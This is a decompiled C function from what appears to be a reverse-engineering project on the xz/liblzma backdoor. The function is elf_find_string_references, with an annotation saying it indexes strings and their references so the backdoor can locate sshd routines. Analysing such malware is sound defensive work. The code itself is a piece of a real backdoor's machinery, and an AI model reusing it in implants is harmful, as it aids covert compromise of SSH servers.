// /home/kali/xzre-ghidra/xzregh/102D30_elf_find_string_references.c
// Function: elf_find_string_references @ 0x102D30
// Calling convention: unknown
// Prototype: undefined elf_find_string_references(void)


/*
 * AutoDoc: Indexes interesting .rodata strings and the instructions that reference them, recording surrounding function bounds for later lookups. Many downstream heuristics consume this table to locate sshd routines and global pointers tied to sensitive behaviour.
 */
#include "xzre_types.h"


void elf_find_string_references(undefined8 param_1,int *param_2)

{
  ulong *puVar1;
  ulong uVar2;
  int iVar3;
  ulong uVar4;
  long lVar5;
  ulong *puVar6;
  ulong uVar7;
  ulong uVar8;
  long lVar9;
  int *piVar10;
  ulong uVar11;
  ulong *puVar12;
  long lVar13;
  int local_94;
  ulong local_90 [2];
  ulong local_80;
  long local_78;
  byte local_65;
  uint local_64;
  int local_58;
  long local_50;
  long local_48;
  
  iVar3 = 0x10;
  piVar10 = param_2;
  do {
    *piVar10 = iVar3;
    iVar3 = iVar3 + 8;
    piVar10 = piVar10 + 8;
  } while (iVar3 != 0xe8);
  puVar12 = &local_80;
  for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
    *(undefined4 *)puVar12 = 0;
    puVar12 = (ulong *)((long)puVar12 + 4);
  }
  local_90[0] = 0;
  local_90[1] = 0;
  uVar4 = elf_get_code_segment(param_1,local_90);
  if ((uVar4 != 0) && (0x10 < local_90[0])) {
    uVar11 = local_90[0] + uVar4;
    lVar9 = 0;
    while( TRUE ) {
      local_94 = 0;
      lVar9 = elf_find_string(param_1,&local_94,lVar9);
      if (lVar9 == 0) break;
      lVar13 = 0;
      do {
        if (((*(long *)((long)param_2 + lVar13 + 0x18) == 0) &&
            (*(int *)((long)param_2 + lVar13) == local_94)) &&
           (lVar5 = find_string_reference(uVar4,uVar11,lVar9), lVar5 != 0)) {
          *(long *)((long)param_2 + lVar13 + 0x18) = lVar5;
        }
        lVar13 = lVar13 + 0x20;
      } while (lVar13 != 0x360);
      lVar9 = lVar9 + 1;
    }
    puVar12 = (ulong *)(param_2 + 2);
    puVar1 = (ulong *)(param_2 + 0xda);
    puVar6 = puVar12;
    do {
      uVar8 = puVar6[2];
      if (uVar8 != 0) {
        if (uVar4 <= uVar8) {
          if (*puVar6 < uVar4) {
            *puVar6 = uVar4;
          }
          if (uVar4 != uVar8) goto LAB_00102e58;
        }
        if (uVar4 <= puVar6[1] - 1) {
          puVar6[1] = uVar4;
        }
      }
LAB_00102e58:
      puVar6 = puVar6 + 4;
      uVar8 = uVar4;
    } while (puVar6 != puVar1);
LAB_00102e64:
    if (uVar8 < uVar11) {
      iVar3 = x86_dasm(&local_80,uVar8,uVar11);
      uVar8 = uVar8 + 1;
      if (iVar3 != 0) {
        uVar8 = local_80 + local_78;
        if (local_58 == 0x168) {
          if (local_48 == 0) goto LAB_00102e64;
          uVar7 = local_80 + local_48 + local_78;
LAB_00102ee5:
          if (uVar7 == 0) goto LAB_00102e64;
        }
        else {
          uVar7 = local_80;
          if (local_58 == 0xa5fe) goto LAB_00102ee5;
          if (((local_58 != 0x10d) || ((local_65 & 0x48) != 0x48)) ||
             ((local_64 & 0xff00ff00) != 0x5000000)) goto LAB_00102e64;
          uVar7 = local_50 + uVar8;
        }
        if ((uVar4 <= uVar7) && (puVar6 = puVar12, uVar7 <= uVar11)) {
          do {
            uVar2 = puVar6[2];
            if (uVar2 != 0) {
              if (uVar7 <= uVar2) {
                if (*puVar6 < uVar7) {
                  *puVar6 = uVar7;
                }
                if (uVar2 != uVar7) goto LAB_00102f31;
              }
              if (uVar7 <= puVar6[1] - 1) {
                puVar6[1] = uVar7;
              }
            }
LAB_00102f31:
            puVar6 = puVar6 + 4;
          } while (puVar6 != puVar1);
        }
      }
      goto LAB_00102e64;
    }
    while (uVar8 = elf_find_rela_reloc(param_1,0,uVar4,uVar11,local_90 + 1), puVar6 = puVar12,
          uVar8 != 0) {
      do {
        uVar7 = puVar6[2];
        if (uVar7 != 0) {
          if (uVar8 <= uVar7) {
            if (*puVar6 < uVar8) {
              *puVar6 = uVar8;
            }
            if (uVar8 != uVar7) goto LAB_00102f8e;
          }
          if (uVar8 <= puVar6[1] - 1) {
            puVar6[1] = uVar8;
          }
        }
LAB_00102f8e:
        puVar6 = puVar6 + 4;
      } while (puVar6 != puVar1);
    }
    do {
      uVar4 = puVar12[2];
      if (uVar4 != 0) {
        if (uVar11 <= uVar4) {
          if (*puVar12 < uVar11) {
            *puVar12 = uVar11;
          }
          if (uVar4 != uVar11) goto LAB_00102fad;
        }
        if (uVar11 <= puVar12[1] - 1) {
          puVar12[1] = uVar11;
        }
      }
LAB_00102fad:
      puVar12 = puVar12 + 4;
    } while (puVar12 != puVar1);
  }
  return;
}

